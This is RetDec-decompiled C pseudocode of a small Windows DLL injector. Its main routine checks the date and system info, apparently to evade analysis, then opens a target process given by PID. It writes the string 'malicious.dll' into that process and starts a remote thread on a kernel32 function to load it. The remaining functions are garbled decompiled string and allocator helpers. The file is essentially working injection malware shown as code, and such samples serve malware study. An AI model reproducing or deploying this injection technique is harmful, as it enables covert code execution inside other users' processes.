//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

struct _SYSTEM_INFO {
    int32_t e0;
    int32_t e1;
    int32_t * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
};

// ------------------------- Classes --------------------------

// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVbad_array_new_length@std@@ (base classes: .?AVexception@std@@, .?AVbad_alloc@std@@)
// .?AVexception@std@@
// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t function_401000(int32_t * a1);
int32_t function_4011e0(void);
int32_t function_401220(int32_t a1);
int32_t function_401280(uint32_t a1, uint32_t a2);
int32_t function_401380(uint32_t a1, uint32_t a2);
int32_t function_4013e0(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_401510(int32_t a1);
int32_t function_4015f7(void);
int32_t function_4016b0(uint32_t a1);
int32_t function_4017e0(int32_t a1);
int32_t function_401c49(void);

// --------------------- Global Variables ---------------------

int32_t g1;

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x401080
int32_t function_401000(int32_t * a1) {
    int32_t * v1 = _errno(); // 0x40101c
    char * base = (char *)10; // bp-24, 0x401022
    *v1 = 0;
    int32_t wendptr; // bp-12, 0x401000
    int32_t wstr; // 0x401000
    wcstol((int16_t *)wstr, (int16_t **)&wendptr, (int32_t)base);
    int32_t v2; // bp-20, 0x401000
    int32_t v3 = &v2; // 0x40103d
    if (wstr == wendptr) {
        // 0x40103f
        base = "invalid stoi argument";
        _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z("invalid stoi argument");
        v3 = (int32_t)&base;
    }
    // 0x40104a
    if (*_errno() != 34) {
        // 0x401055
        return _40___security_check_cookie_40_4();
    }
    // 0x401067
    *(int32_t *)(v3 - 4) = (int32_t)"stoi argument out of range";
    _3f__Xout_of_range_40_std_40__40_YAXPBD_40_Z((char *)&g1);
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x401080 - 0x4011d7
int main(int argc, char ** argv) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x401090
    __writefsdword(0, (int32_t)&v1);
    int16_t lpSystemTime; // bp-36, 0x401080
    struct _SYSTEMTIME * v2 = (struct _SYSTEMTIME *)&lpSystemTime; // bp-116, 0x4010b1
    GetLocalTime((struct _SYSTEMTIME *)&lpSystemTime);
    int16_t v3; // 0x401080
    int16_t v4; // 0x401080
    if (v3 == 10 != (v4 == 11 == lpSystemTime == 2040)) {
        // 0x4010e7
        *(int32_t *)((int32_t)&v2 - 4) = -1;
        exit((int32_t)&g1);
        // UNREACHABLE
    }
    // 0x4010d1
    int32_t lpSystemInfo; // bp-72, 0x401080
    struct _SYSTEM_INFO * v5 = (struct _SYSTEM_INFO *)&lpSystemInfo; // bp-120, 0x4010d4
    GetSystemInfo((struct _SYSTEM_INFO *)&lpSystemInfo);
    int32_t v6; // 0x401080
    if (argc == 2 != v6 > 3) {
        // 0x4010e7
        *(int32_t *)((int32_t)&v5 - 4) = -1;
        exit((int32_t)&g1);
        // UNREACHABLE
    }
    // 0x4010ef
    function_401220(*(int32_t *)((int32_t)argv + 4));
    int32_t v7; // bp-96, 0x401080
    int32_t dwProcessId = function_401000(&v7); // 0x401105
    function_4011e0();
    int32_t * hProcess = OpenProcess(0x1fffff, false, dwProcessId); // 0x40111f
    if (hProcess == NULL) {
        // 0x40112b
        exit(-1);
        // UNREACHABLE
    }
    int32_t (*func)() = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), (char *)&g1); // 0x401144
    if (func == NULL) {
        // 0x401150
        exit(-1);
        // UNREACHABLE
    }
    int32_t * lpBaseAddress = VirtualAllocEx(hProcess, NULL, 13, 0x3000, 4); // 0x401164
    if (lpBaseAddress == NULL || !WriteProcessMemory(hProcess, lpBaseAddress, (int32_t *)"malicious.dll", 13, NULL) || CreateRemoteThread(hProcess, NULL, 0, (int32_t (*)(int32_t *))func, lpBaseAddress, 0, NULL) == NULL) {
        // 0x401170
        exit(-1);
        // UNREACHABLE
    }
    // 0x4011b2
    CloseHandle(hProcess);
    __writefsdword(0, v1);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4011e0 - 0x401218
int32_t function_4011e0(void) {
    // 0x4011e0
    int32_t v1; // 0x4011e0
    int32_t * v2 = (int32_t *)(v1 + 20); // 0x4011e3
    uint32_t v3 = *v2; // 0x4011e3
    if (v3 >= 8) {
        // 0x4011eb
        function_401380(v1, v3 + 1);
    }
    // 0x4011f4
    *v2 = 7;
    *(int32_t *)(v1 + 16) = 0;
    *(int16_t *)v1 = 0;
    return 0;
}

// Address range: 0x401220 - 0x401280
int32_t function_401220(int32_t a1) {
    // 0x401220
    int32_t result; // 0x401220
    *(int32_t *)(result + 20) = 7;
    *(int32_t *)(result + 16) = 0;
    *(int16_t *)result = 0;
    if (*(int16_t *)a1 == 0) {
        // 0x401241
        function_401280(a1, 0);
        return result;
    }
    int32_t v1 = a1 + 2; // 0x401263
    while (*(int16_t *)v1 != 0) {
        // 0x401260
        v1 += 2;
    }
    // 0x40126b
    function_401280(a1, (-2 - a1 + v1) / 2);
    return result;
}

// Address range: 0x401280 - 0x401375
int32_t function_401280(uint32_t a1, uint32_t a2) {
    // 0x401280
    int32_t v1; // 0x401280
    int32_t v2; // bp-16, 0x401280
    char * v3; // bp-20, 0x401280
    int32_t result; // 0x401280
    if (a1 != 0) {
        int32_t v4 = *(int32_t *)(result + 20); // 0x40128e
        uint32_t v5 = v4 < 8 ? result : v4;
        v1 = v4;
        if (v5 <= a1) {
            // 0x4012a0
            v1 = v4;
            if (2 * *(int32_t *)(result + 16) + v5 > a1) {
                // 0x4012b5
                v2 = a2;
                int32_t v6 = (a1 - v5) / 2; // 0x4012c7
                v3 = (char *)v6;
                int32_t v7; // 0x401280
                int32_t v8; // 0x401280
                int32_t v9; // 0x401280
                return function_4013e0(result, v6, a2, v7, v9, v8);
            }
        }
    }
    int32_t v10 = &v2; // 0x4012e0
    if (a2 >= 0x7fffffff) {
        // 0x4012e2
        v3 = "string too long";
        _3f__Xlength_error_40_std_40__40_YAXPBD_40_Z("string too long");
        v10 = (int32_t)&v3;
    }
    int32_t * v11 = (int32_t *)(result + 20); // 0x4012ed
    uint32_t v12 = *v11; // 0x4012ed
    int32_t * v13; // 0x401280
    int32_t v14; // 0x401280
    int32_t v15; // 0x401280
    if (v12 >= a2) {
        if (a2 == 0) {
            // 0x40130f
            *(int32_t *)(result + 16) = a2;
            if (v12 < 8) {
                // 0x401328
                *(int16_t *)result = 0;
                return result;
            }
            // 0x401318
            *(int16_t *)v1 = 0;
            return result;
        }
        // 0x401301
        v13 = (int32_t *)(result + 16);
        v15 = v12 < 8 ? result : v1;
        v14 = v10;
    } else {
        int32_t * v16 = (int32_t *)(result + 16);
        *(int32_t *)(v10 - 4) = *v16;
        int32_t v17 = v10 - 8; // 0x4012f7
        *(int32_t *)v17 = a2;
        function_401510((int32_t)&g1);
        v13 = v16;
        v14 = v17;
        if (a2 == 0) {
            // 0x40136c
            return result;
        }
    }
    int32_t v18 = 2 * a2;
    *(int32_t *)(v14 - 4) = v18;
    *(int32_t *)(v14 - 8) = a1;
    *(int32_t *)(v14 - 12) = v15;
    memcpy(&g1, &g1, (int32_t)&g1);
    *v13 = a2;
    if (*v11 >= 8) {
        // 0x401353
        *(int16_t *)(v15 + v18) = 0;
        return result;
    }
    // 0x401364
    *(int16_t *)(result + v18) = 0;
    // 0x40136c
    return result;
}

// Address range: 0x401380 - 0x4013de
int32_t function_401380(uint32_t a1, uint32_t a2) {
    int32_t v1 = a2; // 0x40138e
    if (a2 <= 0xffffffff) {
        // 0x401390
        _invalid_parameter_noinfo_noreturn();
        v1 = &g1;
    }
    // 0x401396
    if (2 * v1 < 0x1000) {
        // 0x4013d1
        return function_4017e0(a1);
    }
    if ((a1 & 31) != 0) {
        // 0x4013a4
        _invalid_parameter_noinfo_noreturn();
    }
    uint32_t v2 = *(int32_t *)(a1 - 4); // 0x4013aa
    int32_t v3 = v2; // 0x4013af
    if (v2 >= a1) {
        // 0x4013b1
        _invalid_parameter_noinfo_noreturn();
        v3 = &g1;
    }
    uint32_t v4 = a1 - v3; // 0x4013b7
    int32_t v5 = v3; // 0x4013bc
    if (v4 < 4) {
        // 0x4013be
        _invalid_parameter_noinfo_noreturn();
        v5 = &g1;
    }
    int32_t v6 = v5; // 0x4013c7
    if (v4 >= 36) {
        // 0x4013c9
        _invalid_parameter_noinfo_noreturn();
        v6 = &g1;
    }
    // 0x4013d1
    return function_4017e0(v6);
}

// Address range: 0x4013e0 - 0x401507
int32_t function_4013e0(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    uint32_t v1 = *(int32_t *)(a1 + 16); // 0x4013ee
    int32_t v2 = v1; // 0x4013f3
    int32_t v3; // bp-16, 0x4013e0
    int32_t v4 = &v3; // 0x4013f3
    if (v1 < a2) {
        char * v5 = "invalid string position"; // bp-20, 0x4013f5
        v2 = _3f__Xout_of_range_40_std_40__40_YAXPBD_40_Z("invalid string position");
        v4 = (int32_t)&v5;
    }
    uint32_t v6 = v2 - a2; // 0x401403
    uint32_t v7 = v6 < a3 ? v6 : a3; // 0x401407
    int32_t result; // 0x4013e0
    if (result == a1) {
        int32_t v8 = v7 + a2; // 0x40140e
        int32_t * v9 = (int32_t *)(result + 16); // 0x401411
        int32_t v10 = v8; // 0x401414
        int32_t v11 = v4; // 0x401414
        if (*v9 < v8) {
            // 0x401416
            v11 = v4 - 4;
            *(int32_t *)v11 = (int32_t)"invalid string position";
            v10 = _3f__Xout_of_range_40_std_40__40_YAXPBD_40_Z((char *)&g1);
        }
        // 0x401421
        *v9 = v10;
        *(int32_t *)(v11 - 4) = a2;
        *(int32_t *)(v11 - 8) = a2;
        int32_t v12 = 2 * v10;
        if (*(int32_t *)(result + 20) < 8) {
            // 0x401444
            *(int16_t *)(v12 + result) = 0;
            function_4016b0((int32_t)&g1);
            return result;
        }
        // 0x40142a
        *(int16_t *)(v12 + a2) = 0;
        function_4016b0((int32_t)&g1);
        return result;
    }
    int32_t v13 = v4; // 0x401464
    if (v7 >= 0x7fffffff) {
        // 0x401466
        v13 = v4 - 4;
        *(int32_t *)v13 = (int32_t)"string too long";
        _3f__Xlength_error_40_std_40__40_YAXPBD_40_Z((char *)&g1);
    }
    int32_t * v14 = (int32_t *)(result + 20); // 0x401471
    uint32_t v15 = *v14; // 0x401471
    int32_t v16; // 0x4013e0
    if (v15 >= v7) {
        // 0x40149a
        v16 = v13;
        if (v7 == 0) {
            // 0x40149e
            *(int32_t *)(result + 16) = v7;
            if (v15 < 8) {
                // 0x4014b7
                *(int16_t *)result = 0;
                return result;
            }
            // 0x4014a7
            *(int16_t *)a2 = 0;
            return result;
        }
    } else {
        // 0x401476
        *(int32_t *)(v13 - 4) = *(int32_t *)(result + 16);
        int32_t v17 = v13 - 8; // 0x40147b
        *(int32_t *)v17 = v7;
        function_401510((int32_t)&g1);
        v16 = v17;
        if (v7 == 0) {
            // 0x4014fe
            return result;
        }
    }
    int32_t v18 = a1; // 0x40148c
    if (*(int32_t *)(a1 + 20) >= 8) {
        // 0x40148e
        v18 = *(int32_t *)a1;
    }
    int32_t v19 = 0; // 0x4014c9
    if (v7 != 0) {
        // 0x4014cb
        v19 = 2 * v7;
        *(int32_t *)(v16 - 4) = v19;
        *(int32_t *)(v16 - 8) = v18 + 2 * a2;
        *(int32_t *)(v16 - 12) = *v14 < 8 ? result : a2;
        memcpy(&g1, &g1, (int32_t)&g1);
    }
    // 0x4014dc
    *(int32_t *)(result + 16) = v7;
    if (*v14 >= 8) {
        // 0x4014e5
        *(int16_t *)(v19 + a2) = 0;
        return result;
    }
    // 0x4014f6
    *(int16_t *)(v19 + result) = 0;
    // 0x4014fe
    return result;
}

// Address range: 0x401510 - 0x4015d1
int32_t function_401510(int32_t a1) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x401520
    __writefsdword(0, (int32_t)&v1);
    uint32_t v2 = a1 | 7; // 0x401545
    int32_t v3 = a1; // 0x40154e
    if (v2 < 0x7ffffffe) {
        // 0x401554
        int32_t v4; // 0x401510
        uint32_t v5 = *(int32_t *)(v4 + 20); // 0x401554
        uint32_t v6 = v5 / 2; // 0x401560
        v3 = v2;
        if (v6 > v2 / 3) {
            // 0x401568
            v3 = v5 > 0x7ffffffe - v6 ? 0x7ffffffe : v6 + v5;
        }
    }
    int32_t v7 = v3 + 1; // 0x40157b
    if (v7 == 0) {
        // 0x401589
        return function_4015f7();
    }
    int32_t v8 = v7; // 0x401592
    if (v7 <= 0xffffffff) {
        // 0x401594
        v8 = ?_Xbad_alloc@std@@YAXXZ();
    }
    uint32_t v9 = 2 * v8; // 0x40159a
    if (v9 < 0x1000) {
        // 0x4015c4
        _3f__3f_2_40_YAPAXI_40_Z(v9);
        return function_4015f7();
    }
    if (v9 > 0xffffffdc) {
        // 0x4015aa
        ?_Xbad_alloc@std@@YAXXZ();
    }
    int32_t v10 = _3f__3f_2_40_YAPAXI_40_Z(v9 + 35); // 0x4015b1
    *(int32_t *)((v10 + 35 & -32) - 4) = v10;
    return function_4015f7();
}

// Address range: 0x4015f7 - 0x401678
int32_t function_4015f7(void) {
    // 0x4015f7
    int32_t v1; // 0x4015f7
    int32_t * v2 = (int32_t *)(v1 + 12); // 0x4015f7
    int32_t v3 = *v2; // 0x4015f7
    int32_t v4; // 0x4015f7
    int32_t v5; // 0x4015f7
    if (v3 != 0) {
        // 0x40160e
        memcpy((int32_t *)v5, (int32_t *)v4, 2 * v3);
    }
    int32_t * v6 = (int32_t *)(v4 + 20); // 0x40161b
    uint32_t v7 = *v6; // 0x40161b
    if (v7 >= 8) {
        // 0x401623
        function_401380(v4, v7 + 1);
    }
    // 0x40162c
    *v6 = 7;
    int32_t * v8 = (int32_t *)(v4 + 16); // 0x401637
    *v8 = 0;
    *(int16_t *)v4 = 0;
    int32_t result = *v2; // 0x40164b
    *v8 = result;
    uint32_t v9; // 0x4015f7
    *(int16_t *)(2 * result + (v9 < 8 ? v4 : v5)) = 0;
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return result;
}

// Address range: 0x4016b0 - 0x401739
int32_t function_4016b0(uint32_t a1) {
    // 0x4016b0
    int32_t result; // 0x4016b0
    int32_t * v1 = (int32_t *)(result + 16); // 0x4016ba
    uint32_t v2 = *v1; // 0x4016ba
    if (v2 <= a1) {
        // 0x4016c1
        *v1 = 0;
        if (*(int32_t *)(result + 20) < 8) {
            // 0x4016dd
            *(int16_t *)result = 0;
            return result;
        }
        // 0x4016ce
        *(int16_t *)a1 = 0;
        return result;
    }
    if (a1 == 0) {
        // 0x401731
        return result;
    }
    int32_t * v3 = (int32_t *)(result + 20); // 0x4016ee
    uint32_t v4 = *v3;
    int32_t v5 = v2 - a1; // 0x4016fa
    int32_t v6 = 0; // 0x4016fc
    int32_t v7 = v4; // 0x4016fc
    if (v5 != 0) {
        int32_t v8 = v4 < 8 ? result : a1;
        v6 = 2 * v5;
        memmove((int32_t *)v8, (int32_t *)(v8 + 2 * a1), v6);
        v7 = *v3;
    }
    // 0x401710
    *v1 = v5;
    if (v7 >= 8) {
        // 0x401719
        *(int16_t *)(v6 + a1) = 0;
        return result;
    }
    // 0x401729
    *(int16_t *)(v6 + result) = 0;
    // 0x401731
    return result;
}

// Address range: 0x4017e0 - 0x4017e5
int32_t function_4017e0(int32_t a1) {
    // 0x4017e0
    free(&g1);
    return &g1;
}

// Address range: 0x401c49 - 0x401c56
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_401c49(void) {
    // 0x401c49
    int32_t v1; // 0x401c49
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x401c49
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// --------------- Statically Linked Functions ----------------

// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G_Ref_count_base_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _40___security_check_cookie_40_4(void);

// --------------- Dynamically Linked Functions ---------------

// int32_t ?_Xbad_alloc@std@@YAXXZ(void);
// int32_t _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z(char * a1);
// int32_t _3f__Xlength_error_40_std_40__40_YAXPBD_40_Z(char * a1);
// int32_t _3f__Xout_of_range_40_std_40__40_YAXPBD_40_Z(char * a1);
// int * __cdecl _errno(void);
// void __cdecl _invalid_parameter_noinfo_noreturn(void);
// BOOL CloseHandle(_In_ HANDLE hObject);
// HANDLE CreateRemoteThread(_In_ HANDLE hProcess, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// void exit(int status);
// void free(void * ptr);
// VOID GetLocalTime(_Out_ LPSYSTEMTIME lpSystemTime);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetSystemInfo(_Out_ LPSYSTEM_INFO lpSystemInfo);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memmove(void * dest, const void * src, size_t n);
// HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
// LPVOID VirtualAllocEx(_In_ HANDLE hProcess, _In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// long int wcstol(const wchar_t * restrict nptr, wchar_t ** restrict endptr, int base);
// BOOL WriteProcessMemory(_In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T * lpNumberOfBytesWritten);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (14.0)
// Detected language: C++
// Detected functions: 12